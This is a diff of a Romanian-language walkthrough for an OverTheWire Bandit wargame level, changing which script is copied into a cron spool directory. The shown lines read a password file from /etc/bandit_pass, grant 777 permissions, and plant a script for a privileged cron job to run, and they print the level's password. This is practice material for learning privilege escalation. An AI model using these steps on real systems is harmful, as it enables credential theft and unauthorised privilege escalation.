@@ -267,7 +267,7 @@ cat /etc/bandit_pass/bandit24 > /tmp/b23/password
 -oferim permisiunile lui "badit24" tutror utilizatorilor, astfel incat sa se poata scrie parola in fisierul /tmp/b23/password
 	chmod 777 -R /tmp/rand
 -copiem noul script in locatia celui rulat de sistem
-	cp script.sh /var/spool/bandit24
+	cp pass.sh /var/spool/bandit24
 -dupa 60 se secunde, in fisierul /tmp/b23/password va putea sa fie vizibila parola:
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
